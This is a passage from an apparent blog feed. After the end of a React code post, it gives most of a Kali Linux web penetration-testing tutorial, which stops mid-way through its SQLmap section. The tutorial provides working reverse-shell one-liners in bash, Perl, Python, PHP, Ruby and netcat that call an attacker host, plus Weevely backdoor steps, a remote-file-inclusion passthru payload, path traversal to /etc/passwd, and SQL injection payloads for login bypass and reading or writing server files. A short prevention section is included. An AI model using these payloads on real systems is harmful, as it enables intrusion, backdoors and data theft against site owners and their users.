        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"homepage"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"site-title"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nx"&gt;An&lt;/span&gt; &lt;span class="nx"&gt;Awesome&lt;/span&gt; &lt;span class="nx"&gt;Landing&lt;/span&gt; &lt;span class="nx"&gt;Page&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/h1&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"buttons"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Link&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/register"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nx"&gt;Sign&lt;/span&gt; &lt;span class="nx"&gt;Up&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/Link&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Link&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/login"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nx"&gt;Log&lt;/span&gt; &lt;span class="nx"&gt;In&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/Link&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/div&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/div&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;Landing&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;propTypes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mapStateToProps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;
    &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;mapStateToProps&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nx"&gt;Landing&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Web Penetration Testing with Kali Linux</title><link href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html" rel="alternate"></link><published>2020-09-11T00:00:00+10:00</published><updated>2020-09-11T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-11:/web-penetration-testing-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/gaining-access-with-kali-linux.html"&gt;Gaining Access with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#web-information-gathering"&gt;Web Information Gathering&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-subdomains"&gt;Discovering Subdomains&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#bash"&gt;Bash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#perl"&gt;PERL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#python"&gt;Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#php"&gt;PHP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ruby"&gt;Ruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#netcat"&gt;Netcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#local-file-inclusion"&gt;Local File Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#remote-file-inclusion"&gt;Remote File Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#reading"&gt;Reading&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#writing"&gt;Writing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="web-information-gathering"&gt;Web Information Gathering&lt;/h2&gt;
&lt;p&gt;As per the last two posts, information is power is security. So we always start by gathering as much information as possible about the target as this may inform us on the best way to carry out an attack.&lt;/p&gt;
&lt;p&gt;Some helpful tools for learning information about websites are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="http://whois.domaintools.com/"&gt;http://whois.domaintools.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Find info about the owner of the target, also possibly webserver results. Look at hosting and info, possibly for social engineering.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sitereport.netcraft.com/"&gt;https://sitereport.netcraft.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Shows technologies used on the target. Look at the technologies used for exploits, and coding languages used (code your virus in  languages that the server can understand).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.exploit-db.com/"&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Database of exploits, make sure versions match.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.robtex.com/"&gt;https://www.robtex.com/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Comprehensive DNS information.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Several websites can be installed on a single computer (same IP). If you cannot get into your target try to hack into another website. Another way of getting websites on the same IP (other than Robtex) is to go to bing and search &lt;code&gt;ip:[target_ip]&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id="discovering-subdomains"&gt;Discovering Subdomains&lt;/h3&gt;
&lt;p&gt;Use a tool called knock (typically install into /opt on Kali). As with most of the tools on Kali linux, Knock is open source and can be found &lt;a href="https://github.com/guelfoweb/knock"&gt;https://github.com/guelfoweb/knock&lt;/a&gt;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git clone &amp;lt;https://github.com/guelfoweb/knock.git&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;cd into the folder.&lt;/li&gt;
&lt;li&gt;run it using, &lt;code&gt;python knock.py [target]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;if doesn't work try running the above with --resolve , then run the above again.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Subdomains sometimes contain beta testing applications and scripts. look for exploits in these areas.&lt;/p&gt;
&lt;h3 id="discovering-sensitive-files"&gt;Discovering Sensitive Files&lt;/h3&gt;
&lt;p&gt;Use &lt;a href="https://tools.kali.org/web-applications/dirb"&gt;dirb&lt;/a&gt; (use &lt;code&gt;man dirb&lt;/code&gt; for help). DIRB is a web content scanner, which looks for existing (or hidden) Web Objects. DIRB works by launching a dictionary attack against a web server and analyses the response (essentially just try different file names and see if it has a response).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;dirb [target] [wordlist] [options]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;a / usually means you are in a directory.&lt;/li&gt;
&lt;li&gt;phpinfo.php - very useful information, robots.txt -hidden information that admins don't want us to see.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="exploiting-server-vulnerabilities"&gt;Exploiting Server Vulnerabilities&lt;/h2&gt;
&lt;p&gt;The following are a series of ways to exploit web servers for different outcomes.&lt;/p&gt;
&lt;h3 id="exploiting-file-upload-vulnerabilities-to-gain-access"&gt;Exploiting File Upload Vulnerabilities to Gain Access&lt;/h3&gt;
&lt;p&gt;Using a tool called &lt;a href="https://tools.kali.org/maintaining-access/weevely"&gt;Weevely&lt;/a&gt;. Weevely is a stealthy web shell to simulate a telnet-like connection. This is useful as a backdoor and/or to manage web accounts on a web server.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;weevly generate [password] [path+filename]&lt;/code&gt; - create backdoor&lt;/li&gt;
&lt;li&gt;upload the file.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;weevly [url_to_file]&lt;/code&gt; - connect to the file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;help&lt;/code&gt; - help&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Before trying to use tools just browse the website and get a feel for it, look for exploits in features, specifically if the website allows for an upload.&lt;/p&gt;
&lt;h3 id="exploiting-code-execution-vulnerabilities"&gt;Exploiting Code Execution Vulnerabilities&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Always experiment with any input boxes you see, as they are executing a command, you might be able to change the command.&lt;/li&gt;
&lt;li&gt;Can use &amp;amp;&amp;amp; or ; in unix to execute multiple commands in one line. Test if input box allows this.&lt;/li&gt;
&lt;li&gt;Most servers have python and netcat.&lt;/li&gt;
&lt;li&gt;Listen for incoming connections, example using netcat:&lt;ul&gt;
&lt;li&gt;&lt;code&gt;netcat -vv -l -p [port]&lt;/code&gt; - listens for connections on port 8080&lt;/li&gt;
&lt;li&gt;ie. nc -e /bin/sh [ip] [port] - netcat connection.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Following this are a list of commands that you could execute to get a reverse connection for different supported languages. Where the variable to change denoted by &lt;code&gt;[HOST_IP]&lt;/code&gt; and optionally to change the port. Note that these are all 'one-liners' so they could be executed in input boxes.&lt;/p&gt;
&lt;h4 id="bash"&gt;Bash&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/&lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt;/8080 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="perl"&gt;PERL&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;perl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="s"&gt;'use Socket;$i="[HOST_IP]";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="python"&gt;Python&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST_IP]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="php"&gt;PHP&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;php -r '$sock=fsockopen("[HOST_IP]",8080);exec("/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="ruby"&gt;Ruby&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rsocket&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="s1"&gt;'f=TCPSocket.open("[HOST_IP]",8080).to_i;exec sprintf("/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d",f,f,f)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id="netcat"&gt;Netcat&lt;/h4&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -e /bin/sh &lt;span class="o"&gt;[&lt;/span&gt;HOST_IP&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id="local-file-inclusion"&gt;Local File Inclusion&lt;/h3&gt;
&lt;p&gt;Allows an attacker to read ANY file on the same server. Allows access of outside www folder. /etc/passwd contains all the users for the current os. Go back into the directories to find the above file. So if the url contains something like &lt;code&gt;page=include.php&lt;/code&gt;, do something like &lt;code&gt;page=/../../../../../etc/passwd&lt;/code&gt;. What this does is by instead of loading the specific file that was originally targeted, we can load something that it wasn't intending to load from the same server.&lt;/p&gt;
&lt;h3 id="remote-file-inclusion"&gt;Remote File Inclusion&lt;/h3&gt;
&lt;p&gt;If doing this on an actual server the file you want to access has to have a real IP or domain name.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;create a php file with the following:&lt;/li&gt;
&lt;/ol&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"[command]"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;passthru executes system commands. For example use the netcat command as above.&lt;/p&gt;
&lt;p&gt;Ensure this file is stored on a webserver that the target can access. Make sure the file extension is &lt;code&gt;.txt&lt;/code&gt; not &lt;code&gt;.php&lt;/code&gt; or it runs on your webserver.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Listen for connections. &lt;code&gt;nc -vv -l -p [port]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Under the &lt;code&gt;page=&lt;/code&gt; part paste the location of your php file. and add a ? to the end to exe as php eg. &lt;code&gt;page=[ip]/[file]?&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="prevention-of-web-server-exploits"&gt;Prevention of Web Server Exploits&lt;/h2&gt;
&lt;p&gt;The above only happens because the server allows it and is misconfigured.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;File upload vulnerabilities &lt;ul&gt;
&lt;li&gt;Do not allow unsafe files to be uploaded.&lt;/li&gt;
&lt;li&gt;If you are asking for an image ensure it is an image, never allow exe uploads.&lt;/li&gt;
&lt;li&gt;Check the file type, not the extension.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code exec vulnerabilities&lt;ul&gt;
&lt;li&gt;Do'nt use dangerous functions,&lt;/li&gt;
&lt;li&gt;Filter the input before execution&lt;/li&gt;
&lt;li&gt;If you have to use function make sure you analyse the input before exec.&lt;/li&gt;
&lt;li&gt;Use regular expressions (regex).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;File inclusion vulnerabilties&lt;ul&gt;
&lt;li&gt;Disable the allow_url_fopen and allow_url_include settings in php (in the /etc/php5/cgi/php.ini)&lt;/li&gt;
&lt;li&gt;Use static file inclusion (hard code the files)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="sql-injection-and-attacks"&gt;SQL Injection and Attacks&lt;/h2&gt;
&lt;p&gt;Obligatory XKCD comic on SQL injection attacks:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://xkcd.com/327/"&gt;&lt;img alt="Bobby Tables" class="img-fluid" src="https://jackmckew.dev/img/exploits_of_a_mom.png"/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To connect to a mySQL database &lt;code&gt;mysql -u [username] -h [IP of server]&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;show databases;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [database];&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show tables;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="discovering-sql-injections-with-form-submissions-post"&gt;Discovering SQL Injections with Form Submissions (POST)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Whenever you see an input box try to break it, try using AND, ORDER BY or '.&lt;/li&gt;
&lt;li&gt;Look for subtle changes.&lt;/li&gt;
&lt;li&gt;Enter correct info then ' then use AND, use a # as a comment to terminate early.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;An example of this is a user/password input box(s) may potentially be making a SQL query like &lt;code&gt;SELECT * from accounts where user='$USER_INPUT_BOX_VALUE' and password='$PASSWORD_INPUT_BOX_VALUE'&lt;/code&gt;. We could run an injection on this query by setting our password as &lt;code&gt;123456' AND 1=1#&lt;/code&gt;. This would hopefully execute and confirm that we could inject any SQL query into the webserver database (such as show all passwords).&lt;/p&gt;
&lt;h3 id="bypassing-logins-via-injections"&gt;Bypassing Logins via Injections&lt;/h3&gt;
&lt;p&gt;Another neat use would be to inject the SQL query such that the query ends up as &lt;code&gt;SELECT * from accounts where user='admin' and password='wrong_password' or 1=1&lt;/code&gt;, this would potentially log us in as admin without knowing the password at all as the second case in the and statement will be True if the query evaluates 1 to be equal to 1.&lt;/p&gt;
&lt;h3 id="discovering-sql-injections-in-data-retrieval-get"&gt;Discovering SQL Injections in Data Retrieval (GET)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Always try to inject things in the php scripts (in the address bar it will look like index.php&amp;amp;username=xxxx&amp;amp;password=xxxxx)&lt;/li&gt;
&lt;li&gt;Use ORDER BY after a field eg. &lt;code&gt;index.php&amp;amp;username=xxxx' ORDER BY 1 #&amp;amp;password=xxxxx&lt;/code&gt; Ensure to use the URL encoding for symbols ie. # = %23&lt;/li&gt;
&lt;li&gt;Order By column 100000 will return an error keep doing order by 1,2,3,4,5 and when you get an error you know the db has that amount of columns&lt;/li&gt;
&lt;li&gt;Use a union&lt;/li&gt;
&lt;li&gt;eg. &lt;code&gt;index.php&amp;amp;username=xxxx' union 1,2,3,4,5 #&amp;amp;password=xxxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Swap the numbers with other stuff ie. &lt;code&gt;1,database(),user(),version(),5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;union select 1, table_name, null, null,5 from information_schema.tables&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="read-and-writing-files-on-the-server-via-sql"&gt;Read and Writing Files on the Server via SQL.&lt;/h3&gt;
&lt;p&gt;We can also use SQL injections to read/write files that located on the target computer as well.&lt;/p&gt;
&lt;h4 id="reading"&gt;Reading&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;union select null, load_file('/etc/passwd'), null, null,null&lt;/code&gt;&lt;/p&gt;
&lt;h4 id="writing"&gt;Writing&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;union select null, 'example example', null, null,null into outfile '[path]'&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="use-sqlmap-to-do-the-above-and-more"&gt;Use SQLmap to do the Above and More&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;sqlmap --help&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]"&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --dbs&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;to get the databases&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-user&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;to get user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --current-db&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;current database&lt;/li&gt;
&lt;/ul&gt;
